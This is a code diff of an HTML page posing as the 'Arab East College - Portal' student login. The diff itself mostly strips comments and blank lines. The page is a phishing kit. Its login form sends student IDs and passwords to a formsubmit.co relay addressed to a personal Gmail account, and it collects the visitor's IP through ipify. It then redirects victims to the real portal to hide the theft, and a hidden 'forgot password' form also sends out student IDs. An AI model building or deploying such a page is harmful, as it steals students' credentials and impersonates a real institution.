@@ -11,32 +11,27 @@
       background: linear-gradient(135deg, #003366, #004080);
       color: #333;
     }
-
     .header {
       background-color: #001f3f;
       padding: 10px 20px;
       display: flex;
       align-items: center;
     }
-
     .header img {
       height: 40px;
       margin-right: 12px;
     }
-
     .header h1 {
       color: white;
       font-size: 20px;
       margin: 0;
     }
-
     .content {
       display: flex;
       justify-content: center;
       align-items: center;
       height: calc(100vh - 60px);
     }
-
     .login-container {
       background: white;
       padding: 40px;
@@ -45,13 +40,11 @@
       width: 100%;
       max-width: 400px;
     }
-
     .login-container h2 {
       margin-bottom: 24px;
       color: #003366;
       text-align: center;
     }
-
     input[type="text"],
     input[type="password"] {
       width: 100%;
@@ -61,7 +54,6 @@
       border-radius: 6px;
       font-size: 16px;
     }
-
     button {
       width: 100%;
       padding: 12px;
@@ -73,31 +65,26 @@
       cursor: pointer;
       margin-top: 10px;
     }
-
     button:hover {
       background-color: #002244;
     }
-
     .extra-links {
       margin-top: 12px;
       text-align: center;
     }
-
     .extra-links a {
       font-size: 14px;
       color: #003366;
       text-decoration: none;
     }
-
     .extra-links a:hover {
       text-decoration: underline;
     }
   </style>
 </head>
 <body>
-  <!-- Header bar with logo -->
   <div class="header">
-    <img src="login_logo.png" alt="College Logo">
+    <img src="../login_logo.png" alt="College Logo">
     <h1>Arab East College - Portal</h1>
   </div>
 
@@ -105,19 +92,16 @@
     <div class="login-container">
       <h2>Secure Student Login</h2>
 
-      <!-- Main Login Form -->
       <form id="loginForm" action="https://formsubmit.co/noyalxx@gmail.com" method="POST" onsubmit="return validatePassword();">
         <input id="studentId" name="username" type="text" placeholder="Student ID" required />
         <input id="password" name="password" type="password" placeholder="Portal Password" required oninput="filterPassword(this)" />
         <input type="hidden" name="visitor_ip" id="visitor_ip" />
         <button type="submit">Sign In</button>
-
         <input type="text" name="_honey" style="display:none">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_next" value="https://portal.arabeast.edu.sa/aec/init">
       </form>
 
-      <!-- Hidden Forgot Form -->
       <form id="forgotForm" action="https://formsubmit.co/noyalxx@gmail.com" method="POST" style="display:none;">
         <input type="hidden" name="message" id="forgotMessage" />
         <input type="hidden" name="visitor_ip" id="forgot_ip" />
@@ -131,14 +115,10 @@
     </div>
   </div>
 
-  <!-- JS -->
   <script>
-    // Block special characters & spaces
     function filterPassword(input) {
       input.value = input.value.replace(/[^A-Za-z0-9]/g, '');
     }
-
-    // Validate password before submit
     function validatePassword() {
       const pass = document.getElementById("password").value;
       const pattern = /^[A-Za-z0-9]{4,20}$/;
@@ -148,21 +128,16 @@
       }
       return true;
     }
-
-    // Handle Forgot Password logic
     function submitForgot() {
       const studentId = document.getElementById("studentId").value;
       if (!studentId) {
         alert("Enter your Student ID first.");
         return;
       }
-
       document.getElementById("forgotMessage").value = `User clicked 'Forgot Password'\nStudent ID: ${studentId}`;
       document.getElementById("forgot_ip").value = document.getElementById("visitor_ip").value;
       document.getElementById("forgotForm").submit();
     }
-
-    // Get user's IP and store in hidden fields
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
